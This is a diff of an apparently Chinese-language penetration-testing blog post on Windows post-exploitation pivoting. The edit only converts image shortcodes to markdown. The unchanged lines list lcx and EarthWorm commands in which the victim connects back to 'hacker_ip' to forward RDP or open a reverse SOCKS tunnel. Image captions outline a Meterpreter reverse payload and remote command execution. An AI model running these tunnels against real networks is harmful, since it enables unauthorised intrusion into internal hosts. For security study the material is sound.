@@ -29,43 +29,39 @@ topics = ["Pentest"]
 * Hacker：lcx.exe -listen 500 8888
 * Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389
 * Hacker：cmd mstsc hacker_ip:500
-<br /><br />
-{{% fluid_img src="/img/post/privilge_escalation_win_hacker_run_lcx.png" alt="hacker运行lcx.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/privilge_escalation_win_vimctim_run_lcx.png" alt="vimctim端运行lcx.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/privilge_escalation_win_hacker_remote_conn.png" alt="hacker远程连接.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/privilge_escalation_win_hacker_remote_conn_success.png" alt="hacker远程连接成功.png" %}}
+
+![hacker运行lcx](/img/post/privilge_escalation_win_hacker_run_lcx.png)
+![vimctim端运行lcx](/img/post/privilge_escalation_win_vimctim_run_lcx.png)
+![hacker远程连接](/img/post/privilge_escalation_win_hacker_remote_conn.png)
+![hacker远程连接成功](/img/post/privilge_escalation_win_hacker_remote_conn_success.png)
 
 ### 0x04 EarchWorm端口转发
 * Hacker：./ew -s rcsocks -l 1080 -e 8888
 * Victim：./ew -s rssocks -d hacker_ip -e 8888
-<br /><br />
-{{% fluid_img src="/img/post/privilge_escalation_win_earchworm.png" alt="earchworm原理.png" %}}
+![earchworm原理](/img/post/privilge_escalation_win_earchworm.png)
 #### 1. 启动EarchWorm
-{{% fluid_img src="/img/post/privilge_escalation_win_linux_run_ew.png" alt="hacker服务器启动ew.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/privilge_escalation_win_victim_run_ew.png" alt="victim启动ew.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/privilge_escalation_win_linux_get_victim_conn.png" alt="victim连接hacker服务器.png" %}}
+![hacker服务器启动ew](/img/post/privilge_escalation_win_linux_run_ew.png)
+![victim启动ew](/img/post/privilge_escalation_win_victim_run_ew.png)
+![victim连接hacker服务器](/img/post/privilge_escalation_win_linux_get_victim_conn.png)
 #### 2. hacker主机使用代理
-{{% fluid_img src="/img/post/privilge_escalation_win_hacker_set_proxy1.png" alt="hacker内网主机设置代理1.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/privilge_escalation_win_hacker_set_proxy2.png" alt="hacker内网主机设置代理2.png" %}}
+![hacker内网主机设置代理1](/img/post/privilge_escalation_win_hacker_set_proxy1.png)
+![hacker内网主机设置代理2](/img/post/privilge_escalation_win_hacker_set_proxy2.png)
 #### 3. hacker内网主机连接目标的内网主机
-{{% fluid_img src="/img/post/privilge_escalation_win_ew_hacker_remote_conn.png" alt="hacker连接内网主机.png" %}}
-<br /><br />
-{{% fluid_img src="/img/post/privilge_escalation_win_ew_hacker_remote_conn_success.png" alt="hacker连接内网主机成功.png" %}}
+![hacker连接内网主机](/img/post/privilge_escalation_win_ew_hacker_remote_conn.png)
+![hacker连接内网主机成功](/img/post/privilge_escalation_win_ew_hacker_remote_conn_success.png)
 
 ### 0x05 Meterpreter
 * Hacker端生成payload
-{{% fluid_img src="/img/post/privilge_escalation_win_msf_creat_payload.png" alt="msf生成win反弹型的payload.png" %}}
+![msf生成win反弹型的payload](/img/post/privilge_escalation_win_msf_creat_payload.png)
+
 * msf监听端口
-{{% fluid_img src="/img/post/privilge_escalation_win_set_metasploit_listen_port.png" alt="设置metasploit监听端口.png" %}}
+![设置metasploit监听端口](/img/post/privilge_escalation_win_set_metasploit_listen_port.png)
+
 * 目标主机运行exp
-{{% fluid_img src="/img/post/privilge_escalation_win_victim_run_exp.png" alt="目标主机运行exp.png" %}}
+![目标主机运行exp](/img/post/privilge_escalation_win_victim_run_exp.png)
+
 * msf收到新会话
-{{% fluid_img src="/img/post/privilge_escalation_win_msf_get_conn.png" alt="msf收到目标主机的连接.png" %}}
+![msf收到目标主机的连接](/img/post/privilge_escalation_win_msf_get_conn.png)
+
 * msf执行命令
-{{% fluid_img src="/img/post/privilge_escalation_win_msf_exec_command.png" alt="msf远程执行命令.png" %}}
+![msf远程执行命令](/img/post/privilge_escalation_win_msf_exec_command.png)
